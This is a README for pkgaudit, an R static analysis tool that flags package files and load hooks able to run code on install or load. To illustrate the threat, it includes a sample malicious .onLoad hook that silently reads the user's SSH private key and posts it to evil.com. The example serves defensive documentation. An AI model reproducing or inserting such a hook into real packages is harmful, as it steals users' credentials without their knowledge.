# pkgaudit

[![R-CMD-check](https://github.com/tylerjssmith/pkgaudit/actions/workflows/R-CMD-check.yaml/badge.svg)](https://github.com/tylerjssmith/pkgaudit/actions/workflows/R-CMD-check.yaml)
[![osv-scanner](https://github.com/tylerjssmith/pkgaudit/actions/workflows/osv-scanner.yaml/badge.svg)](https://github.com/tylerjssmith/pkgaudit/actions/workflows/osv-scanner.yaml)

pkgaudit is a static analysis security testing (SAST) tool for R source packages. It searches R packages for files that can execute during builds, checks, and installations and code that can execute when a package namespace is loaded, attached, unloaded, or detached. It also scans R source code for security-relevant patterns. Findings do not indicate malicious intent -- rather, findings should be reviewed prior to trusting the package.

## Background

R is a statistical programming language widely used in environments processing sensitive data: clinical trial analyses, government statistics, financial risk modeling, academic research, and more. 

R packages are the primary mechanism for sharing R code. They are also potential attack vectors. When a user calls `install.packages()`, R downloads and installs a package and its dependencies. When a user calls `library()` to load and attach a package, R automatically executes R code contained in `.onLoad()` and `.onAttach()` hooks. 

A malicious package anywhere in the dependency graph can run code on the user’s system without any action beyond a normal R workflow.

A minimal example of what a malicious `.onLoad()` hook might look like is:

``` r
.onLoad <- function(libname, pkgname) {
  tryCatch({
    key <- paste(
      readLines("~/.ssh/id_rsa"), 
      collapse = "\n"
    )
    httr::POST(
      "https://evil.com/evil",
      body = list(key = key)
    )
  }, error = function(e) invisible(NULL))
}
```

This code reads a private cryptographic key and sends it to a server controlled by the attacker. This occurs whenever a package or dependency containing this code is loaded, before any package function is called. `tryCatch()` suppresses any errors, so the user sees nothing unusual even if `readLines()` fails because the file does not exist or the user lacks permission to read it.

Similar attacks have been documented in ecosystems adjacent to R. In 2022, the Python package ctx on PyPI was [compromised](https://www.sonatype.com/blog/pypi-package-ctx-compromised-are-you-at-risk) to exfiltrate environment variables -- including credentials. In 2024, the Python package ultralytics, a widely used computer vision library, was [compromised](https://pytorch.org/blog/compromised-nightly-dependency/) to distribute a cryptominer to its users.

R's use in environments handling sensitive data makes it an attractive target for a broad range of threat actors. The assets at risk include both the data processed in R sessions and the underlying systems on which R runs, which can provide compute resources and credentials for lateral movement. pkgaudit provides one layer of defense against an under-appreciated risk, flagging security-relevant files and code in R packages for manual review.

## Rule Coverage

pkgaudit v0.3.0 separates *when* code executes from *what* code does using three categories of rules:

- **File contexts** are files that R executes at build-, check-, or install-time.
- **Code contexts** are top-level R source code and lifecycle hooks whose bodies run automatically when a namespace is loaded, attached, unloaded, or detached.
- **Patterns** are security-relevant function calls. Each pattern finding is attributed to the code context it executes in, so a `system()` call inside `.onLoad` is distinguished from one inside an ordinary function ("Other") or at top level ("Top-level").

See [RULES.md](RULES.md) for the full rule set, with the file, hook, or function calls each rule covers. Each rule is defined in a YAML file under [inst/rules/](inst/rules/) and compiled into the SQLite database at `inst/db/rules.db`.

## Installation

You can install pkgaudit as follows:

``` r
remotes::install_github("tylerjssmith/pkgaudit")
```

## Database Integrity

pkgaudit detects patterns using a SQLite database of rules shipped with the package at `inst/db/rules.db`. To verify that your installed copy of the database has not been modified since publication, check its SHA-256 hash against the value published here:

``` r
digest::digest(
  system.file("db", "rules.db", package = "pkgaudit"),
  algo = "sha256",
  file = TRUE
)
```
Expected SHA-256: `aaf0336597a4b4c82242a234876364b44b54da324f3b48f100aaa0e3a6a1a9aa`

The hash is regenerated automatically by `inst/scripts/build_db.R` whenever the database is rebuilt and should match the value above exactly. `load_rules()` verifies the database against its bundled `.sha256` sidecar on every call and refuses to load a modified database.

## Usage

A source package tarball may scanned before installation as follows:

``` r
library(pkgaudit)
rules  <- load_rules()
result <- audit_tarball("path/to/foo_1.0.0.tar.gz", rules = rules)

result$file_contexts  # security-relevant files
result$code_contexts  # hooks / top-level code
result$patterns       # security-relevant calls, each with its code_context
result$errors         # any files or rules that could not be processed
result$metadata       # package name/version, SHA-256, rules version, scan time

# audit_package() returns a `pkgaudit` object with print and summary methods
# that summarize the scan metadata and finding counts:
print(result)
summary(result)

# Users can omit the local path from shared output
print(result, path = FALSE)
summary(result, path = FALSE)
```





